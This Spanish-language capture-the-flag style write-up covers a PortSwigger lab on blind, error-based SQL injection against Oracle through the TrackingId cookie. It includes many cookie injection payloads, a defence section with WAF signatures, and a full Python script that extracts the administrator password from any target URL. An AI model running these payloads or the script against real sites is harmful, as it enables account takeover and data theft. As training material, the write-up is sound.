# Blind SQL injection with conditional errors

**Categoría:** SQLi (Blind – error‑based condicional)  
**Dificultad:** Practitioner  
**Fuente:** PortSwigger Web Security Academy

***

# 🎯 Resumen

*   **Objetivo del lab**: Explotar una inyección SQL ciega en la cookie `TrackingId` para **provocar errores condicionados** y así inferir información de la BD hasta extraer la **contraseña** del usuario `administrator`, y autenticar.
*   **Vulnerabilidad principal**: El backend concatena directamente el valor de `TrackingId` en una consulta SQL. La aplicación **no** diferencia cuando la consulta devuelve o no filas, pero **sí** cuando la consulta **lanza un error**, devolviendo HTTP 500 / mensaje de error personalizado.
*   **Impacto esperado**: Exposición de datos sensibles y compromiso de cuenta administrativa.

***

# 🧭 Reconocimiento

*   **Mapa de la aplicación**: En la home, el servidor lee `TrackingId` y lo inserta en una sentencia SQL (analytics/“visto recientemente”, etc.).
*   **Comportamiento clave de respuesta**:
    *   **Sin error** → respuesta normal (HTTP 200).
    *   **Con error SQL** → respuesta diferenciada (HTTP 500 o banner de error).
*   **Vector**: cookie `TrackingId` — la inyección ocurre dentro de un **literal de cadena** SQL:
    ```http
    Cookie: TrackingId=xyz'...; session=<...>
    ```
*   **Señal inicial**:
    *   Añadir `'` produce **error** → probable **ruptura de sintaxis** (literal no cerrado).
    *   Duplicar `'` a `''` (escape estándar SQL) elimina el error → indica que el valor se inserta **como texto** en un literal.

> **Por qué `'` rompe y `''` repara**  
> Los literales de cadena en SQL se delimitan con `'...'`. Inyectar una `'` “suelta” cierra el literal antes de tiempo y el resto del SQL queda mal formado. El escape estándar es **duplicar** la comilla (`''`), que representa un carácter `'` **dentro** del literal, manteniendo la sintaxis intacta.

***

# 🧪 Detección y confirmación del SGBD (DBMS)

Antes de diseñar el payload definitivo, conviene **identificar el motor** de base de datos. El **mismo** bug se explota de manera distinta en MySQL/SQL Server/PostgreSQL/Oracle por diferencias de **concatenación**, **tabla dummy**, **funciones** y **mensajes de error**. A continuación, una secuencia de **pruebas de sonda** (cada una debe mantener **sintaxis válida**) y cómo **interpretarlas** para acabar concluyendo que es **Oracle**.

> **Importante:** cada sonda se inyecta cerrando el literal y concatenando la expresión de prueba de forma segura. Partimos de un valor legítimo `TrackingId=xyz`.

## 1) ¿Qué operador de **concatenación** acepta?

Prueba **Oracle/ANSI**:

```http
Cookie: TrackingId=xyz'||'A'||'
```

*   Si **no** hay error → el motor acepta `||` como concatenación de texto.  
    (MySQL también soporta `||` pero como **OR lógico** a menos que `PIPES_AS_CONCAT` esté activo; si el valor resultante no es una cadena válida, suelen aparecer inconsistencias).

Prueba **SQL Server**:

```http
Cookie: TrackingId=xyz'+'A'+'
```

*   Si con `+` **funciona** y con `||` **falla** → probable SQL Server (en T‑SQL `+` concatena).
*   Si con `+` **falla** y con `||` **funciona** → descarta SQL Server.

Prueba **MySQL** explícita (función de concatenación):

```http
Cookie: TrackingId=xyz'||(SELECT CONCAT('A','B'))||'
```

*   Si falla **y** la versión con `FROM dual` (más abajo) **funciona**, apunta a Oracle.

**Observación típica en este lab**: `||` **funciona** (no error). `+` **falla** (error de sintaxis). Primer indicio a favor de **Oracle/PostgreSQL**.

## 2) ¿Requiere **tabla dummy** en `SELECT` escalar?

Sonda **sin tabla**:

```http
Cookie: TrackingId=xyz'||(SELECT '')||'
```

*   Si esto **falla**, prueba con **DUAL**:
    ```http
    Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'
    ```
    *   Si **DUAL** **funciona** y la anterior no → el motor **requiere** `FROM <tabla>` incluso para constantes: **Oracle**.

En **PostgreSQL**, `SELECT ''` **sin FROM** es válido; en **MySQL**, **también** (y `dual` existe como vista de compatibilidad). En **SQL Server**, `SELECT ''` sin FROM es válido. El hecho de que **solo funcione** con `FROM dual` es un **indicador muy fuerte** de **Oracle**.

## 3) ¿Qué **funciones** y **pseudocolumnas** acepta?

*   **Oracle**: `LENGTH`, `SUBSTR`, `TO_CHAR`, `ROWNUM`, `DUAL`.
*   **PostgreSQL**: `LENGTH`, `SUBSTRING`, `CAST(... AS text)`, no `ROWNUM`, ni necesita `DUAL`.
*   **MySQL**: `LENGTH`, `SUBSTRING`/`SUBSTR`, `CAST(... AS CHAR)`, no requiere `DUAL`.
*   **SQL Server**: `LEN`, `SUBSTRING`, `CONVERT(VARCHAR, ...)`, no `DUAL`.

Sondas:

```http
# Probar función y pseudotabla Oracle
Cookie: TrackingId=xyz'||(SELECT LENGTH('abc') FROM dual)||'

# Probar pseudocolumna de Oracle
Cookie: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```

*   Si `LENGTH(... ) FROM dual` y `ROWNUM` **funcionan** → **Oracle**.
*   En otros motores, `ROWNUM` es desconocido → error.

## 4) ¿Cómo reacciona a un **error aritmético** controlado?

```http
Cookie: TrackingId=xyz'||(SELECT TO_CHAR(1/0) FROM dual)||'
```

*   En **Oracle**, `1/0` produce `ORA-01476` (divide-by-zero). Si la app transforma esto en HTTP 500, confirmas que **los errores SQL** son visibles y que **TO\_CHAR** existe (Oracle).

**Conclusión razonada**  
Con las pruebas de arriba, la combinación:

*   `||` como concatenación **válida**
*   `SELECT ''` **falla**, pero `SELECT '' FROM dual` **funciona**
*   `ROWNUM` es aceptado
*   `TO_CHAR(1/0)` dispara error controlable

lleva a concluir **Oracle** con muy alta confianza.

***

# 🛠️ Explotación paso a paso (Oracle)

> **Contexto**: seguiremos el patrón de concatenación **Oracle** y canalizaremos **TRUE/FALSE** a **error/no error** usando `CASE WHEN ... THEN TO_CHAR(1/0) ELSE '' END`.

## Paso 0 — Saneamiento de superficie

```http
# Romper literal → error esperado
Cookie: TrackingId=xyz'

# Escapar comillas → repara
Cookie: TrackingId=xyz''

# Subconsulta escalar válida (Oracle: requiere DUAL)
Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'

# Comprobar ejecución real de SQL con tabla inexistente → error
Cookie: TrackingId=xyz'||(SELECT '' FROM not_a_real_table)||'
```

## Paso 1 — Canal booleano por **error condicional**

```http
# TRUE → 500
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
# FALSE → 200
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

> **Por qué funciona**: `CASE` evalúa **solo** la rama que corresponde. En la rama TRUE forzamos un **divide by zero** que Oracle materializa como excepción (`ORA-01476`), visible en la capa web como HTTP **500**.

## Paso 2 — Verificar tabla y usuario

**Tabla `users` accesible** (evitar multirregistro con `ROWNUM=1`):

```http
Cookie: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'
```

**Usuario `administrator` existe** (error si hay al menos una fila):

```http
Cookie: TrackingId=xyz'||(
  SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
  FROM users
  WHERE username='administrator' AND ROWNUM=1
)||'
```

## Paso 3 — Determinar **longitud** de la contraseña

Itera **N** (idealmente con **búsqueda binaria**) sobre `LENGTH(password) > N`:

```http
Cookie: TrackingId=xyz'||(
  SELECT CASE
           WHEN LENGTH(password) > 10 THEN TO_CHAR(1/0) ELSE ''
         END
  FROM users
  WHERE username='administrator' AND ROWNUM=1
)||'
```

*   **500** → la longitud es **> 10**.
*   **200** → la longitud es **≤ 10**.  
    En el lab, la longitud real es **20**.

## Paso 4 — Extraer por **posición** (carácter a carácter)

Para la posición `i`, prueba con `SUBSTR(password,i,1)`:

```http
# Ejemplo: ¿pos 1 == 'a'?
Cookie: TrackingId=xyz'||(
  SELECT CASE
           WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE ''
         END
  FROM users
  WHERE username='administrator' AND ROWNUM=1
)||'
```

*   Señal en el lab: HTTP **500** cuando **aciertas**.
*   Conjunto de búsqueda: `a-z0-9` (puedes usar **Intruder** con “Simple list” o un script con **búsqueda binaria** por `ASCII`).

**Optimización: binaria por ASCII**

```http
# ¿ASCII(SUBSTR(...)) > 109?
Cookie: TrackingId=xyz'||(
  SELECT CASE
           WHEN ASCII(SUBSTR(password,1,1)) > 109 THEN TO_CHAR(1/0) ELSE ''
         END
  FROM users
  WHERE username='administrator' AND ROWNUM=1
)||'
```

***

# ✅ PoC mínima

```http
# 1) Sintaxis rompe/repara
Cookie: TrackingId=xyz'
Cookie: TrackingId=xyz''

# 2) Confirmar concatenación y DUAL
Cookie: TrackingId=xyz'||(SELECT '' FROM dual)||'

# 3) Forzar error consultando tabla inexistente
Cookie: TrackingId=xyz'||(SELECT '' FROM not_a_real_table)||'

# 4) Canal booleano (TRUE → 500, FALSE → 200)
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'

# 5) Tabla users accesible
Cookie: TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM=1)||'

# 6) Existe administrator
Cookie: TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ROWNUM=1)||'

# 7) Longitud (ejemplo umbral 19 → TRUE si >19)
Cookie: TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>19 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ROWNUM=1)||'

# 8) Carácter 1 == 'a'
Cookie: TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ROWNUM=1)||'
```

***

# 🔬 Por qué funciona (detalle de gramática y evaluación en Oracle)

1.  **Contexto literal**: el valor de `TrackingId` se inserta en un literal `'...'`. Al inyectar `'|| ... ||'`, cerramos el literal **de forma limpia** y concatenamos una **subconsulta escalar** que devuelve texto. La sintaxis global sigue **siendo válida**.
2.  **Subconsulta escalar**: `SELECT <expr> FROM dual` debe retornar **una fila** y **una columna** (o NULL). Si devuelve **0 filas**, Oracle trata la subconsulta como NULL y la concatenación `expr || NULL` produce `expr` (no error). Si devuelve **>1 fila**, lanza `ORA-01427` (single-row subquery returns more than one row). Por eso limitamos con `ROWNUM=1`.
3.  **Canal booleano basado en error**: `CASE WHEN <cond> THEN TO_CHAR(1/0) ELSE '' END` evalúa a:
    *   **Error** si `<cond>` es **TRUE** (divide-by-zero).
    *   **Cadena vacía** si **FALSE** (la concatenación permanece válida).
        La aplicación traduce ese error SQL a un **HTTP 500** estable → canal lateral confiable.
4.  **Operadores/funciones**: usamos `LENGTH`, `SUBSTR`, `ASCII` para formular **predicados booleanos** sobre los datos reales de la tabla `users`. Cada predicado se convierte en **error/no error**, permitiendo búsquedas **binarias** eficientes (longitud y caracteres).

***

# 🔒 Defensa

*   **Consultas parametrizadas**: jamás concatenar cookies/headers en sentencias SQL.
*   **Gestión uniforme de errores**: mismas plantillas y **mismo código HTTP** en error/no‑error para cortar canales laterales.
*   **Validación/normalización** del `TrackingId` (formato estricto, longitud, charset), o mejor: usar identificadores internos opacos (no controlados por el cliente).
*   **Principio de mínimo privilegio** en la cuenta de BD; negar `SELECT` sobre tablas sensibles.
*   **Rate limiting / detección de anomalías** (picos de solicitudes, patrones de `'||`, `CASE`, `TO_CHAR(1/0)`).
*   **WAF / virtual patching**: firmas para `'||(SELECT`, `FROM dual`, `ROWNUM`, `TO_CHAR(1/0)`.

***

# 📝 Notas y trampas

*   **Cardinalidad**: recuerda `ROWNUM=1` para evitar `ORA-01427`.
*   **Comillas simples**: dentro de literales, **duplicar** (`''`). No dependas de comentarios `--` en este contexto (Oracle requiere salto de línea; además no los necesitamos).
*   **Transporte**: algunos entornos exigen **percent‑encoding** de la cookie (`%27%7C%7C...`). Verifica que el backend reciba los caracteres literales.
*   **Señal**: si no ves el banner de error, usa **código HTTP** y **tamaño de respuesta** como discriminantes.
*   **Alfabeto**: en los labs la pass es `[a-z0-9]{20}`. En entornos reales, amplia al conjunto visible o usa `ASCII` binario.

***

# 📚 Referencias

*   [PortSwigger Lab – Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
*   [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)

***

# 🧩 Script Python

> **Qué hace**:
>
> *   Ejecuta sondas de **detección del SGBD** (concatenación `||`, `DUAL`, `ROWNUM`, error `1/0`).
> *   Construye el **canal TRUE→500 / FALSE→200** con `CASE WHEN ... THEN TO_CHAR(1/0)`.
> *   Obtiene longitud por **búsqueda binaria** y extrae caracteres con **búsqueda binaria de ASCII** (modo general) o restringido a `[0-9a-z]`.
> *   Maneja reintentos y tiempos.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import string
import time
import requests

TIMEOUT = 8
RETRIES = 2
BACKOFF = 0.05

class OracleBlindErrorInjector:
    def __init__(self, base_url, session_cookie, tracking_prefix, verify_tls=True):
        self.base_url = base_url.rstrip('/')
        self.session_cookie = session_cookie
        self.tracking_prefix = tracking_prefix
        self.s = requests.Session()
        self.s.verify = verify_tls

    # ---------------- HTTP ----------------
    def _send(self, tracking_value):
        cookies = {"TrackingId": tracking_value, "session": self.session_cookie}
        for i in range(RETRIES + 1):
            try:
                r = self.s.get(self.base_url, cookies=cookies, timeout=TIMEOUT)
                return r.status_code, len(r.text or "")
            except requests.RequestException:
                if i == RETRIES:
                    raise
                time.sleep(BACKOFF * (i + 1))
        return 0, 0

    # ---------------- Detección DBMS ----------------
    def test_concat_pipes(self):
        # xyz'||'A'||'
        status, _ = self._send(self.tracking_prefix + "'||'A'||'")
        return status < 500

    def test_concat_plus(self):
        # xyz'+'A'+'
        status, _ = self._send(self.tracking_prefix + "'+'A'+'")
        return status < 500

    def test_select_no_from(self):
        # xyz'||(SELECT '')||'
        status, _ = self._send(self.tracking_prefix + "'||(SELECT '')||'")
        return status < 500

    def test_select_from_dual(self):
        # xyz'||(SELECT '' FROM dual)||'
        status, _ = self._send(self.tracking_prefix + "'||(SELECT '' FROM dual)||'")
        return status < 500

    def test_rownum(self):
        status, _ = self._send(self.tracking_prefix + "'||(SELECT '' FROM users WHERE ROWNUM=1)||'")
        return status < 500

    def test_divbyzero(self):
        status, _ = self._send(self.tracking_prefix + "'||(SELECT TO_CHAR(1/0) FROM dual)||'")
        return status >= 500

    def detect_oracle(self):
        """
        Heurística:
        - Acepta '||'  (True)
        - Rechaza SELECT '' sin FROM (False) pero acepta FROM dual (True)
        - Acepta ROWNUM (True)
        - TO_CHAR(1/0) provoca 500 (True)
        - '+' como concatenación (False) refuerza descarte de SQL Server
        """
        pipes = self.test_concat_pipes()
        no_from = self.test_select_no_from()
        dual = self.test_select_from_dual()
        rownum = self.test_rownum()
        divzero = self.test_divbyzero()
        plus = self.test_concat_plus()

        verdict = (pipes is True) and (no_from is False) and (dual is True) and (rownum is True) and (divzero is True)
        details = {
            "concat_||": pipes,
            "select_no_from": no_from,
            "select_from_dual": dual,
            "rownum": rownum,
            "div_by_zero": divzero,
            "concat_+": plus
        }
        return verdict, details

    # ---------------- Canal condicional ----------------
    def _payload_case(self, cond_sql, from_sql="dual"):
        return (
            self.tracking_prefix +
            "'||(" +
            "SELECT CASE WHEN (" + cond_sql + ") THEN TO_CHAR(1/0) ELSE '' END " +
            "FROM " + from_sql +
            ")||'"
        )

    def is_true(self, cond_sql, from_sql="dual"):
        status, _ = self._send(self._payload_case(cond_sql, from_sql))
        return status >= 500

    def admin_exists(self):
        return self.is_true("1=1", "users WHERE username='administrator' AND ROWNUM=1")

    def get_length(self, lo=1, hi=128):
        while lo < hi:
            mid = (lo + hi) // 2
            if self.is_true(f"LENGTH(password) > {mid}", "users WHERE username='administrator' AND ROWNUM=1"):
                lo = mid + 1
            else:
                hi = mid
        return lo

    def get_char_ascii(self, pos, lo=32, hi=126):
        while lo < hi:
            mid = (lo + hi) // 2
            if self.is_true(f"ASCII(SUBSTR(password,{pos},1)) > {mid}", "users WHERE username='administrator' AND ROWNUM=1"):
                lo = mid + 1
            else:
                hi = mid
        ch = chr(lo)
        if self.is_true(f"SUBSTR(password,{pos},1)='{ch}'", "users WHERE username='administrator' AND ROWNUM=1"):
            return ch
        return "?"

    def get_char_alnum(self, pos):
        alphabet = [ord(c) for c in (string.digits + string.ascii_lowercase)]  # 0-9a-z
        lo, hi = 0, len(alphabet) - 1
        while lo < hi:
            mid = (lo + hi) // 2
            if self.is_true(f"ASCII(SUBSTR(password,{pos},1)) > {alphabet[mid]}", "users WHERE username='administrator' AND ROWNUM=1"):
                lo = mid + 1
            else:
                hi = mid
        ch = chr(alphabet[lo])
        if self.is_true(f"SUBSTR(password,{pos},1)='{ch}'", "users WHERE username='administrator' AND ROWNUM=1"):
            return ch
        return "?"

    def extract_password(self, length=None, alnum=True):
        if length is None:
            length = self.get_length()
        chars = []
        for i in range(1, length + 1):
            ch = self.get_char_alnum(i) if alnum else self.get_char_ascii(i)
            chars.append(ch)
            print(f"[+] Pos {i}/{length}: {ch}  => {''.join(chars)}")
        return "".join(chars)

def main():
    ap = argparse.ArgumentParser(description="Blind SQLi (Oracle) por errores condicionales en cookie TrackingId.")
    ap.add_argument("--url", required=True, help="URL base (ej. https://acme.lab/)")
    ap.add_argument("--session", required=True, help="Cookie 'session'")
    ap.add_argument("--tracking", required=True, help="Valor base de TrackingId (ej. 'xyz')")
    ap.add_argument("--alnum", action="store_true", help="Restringir a [0-9a-z]")
    args = ap.parse_args()

    exp = OracleBlindErrorInjector(args.url, args.session, args.tracking)

    print("[*] Detección de SGBD...")
    verdict, details = exp.detect_oracle()
    for k, v in details.items():
        print(f"    - {k}: {v}")
    if not verdict:
        print("[-] No parece Oracle según las sondas; revisa manualmente.")
        return
    print("[+] Oracle confirmado por sondas heurísticas")

    print("[*] Verificando usuario administrator...")
    if not exp.admin_exists():
        print("[-] Usuario administrator no encontrado.")
        return
    print("[+] Usuario administrator detectado")

    print("[*] Calculando longitud de password...")
    length = exp.get_length()
    print(f"[+] Longitud: {length}")

    print("[*] Extrayendo password...")
    password = exp.extract_password(length=length, alnum=args.alnum)
    print(f"[+] Password: {password}")

if __name__ == "__main__":
    main()
```

**Uso de ejemplo:**

```bash
python3 sqli_oracle_conditional_errors.py \
  --url https://TARGET/ \
  --session "<valor_session_cookie>" \
  --tracking "xyz" \
  --alnum
```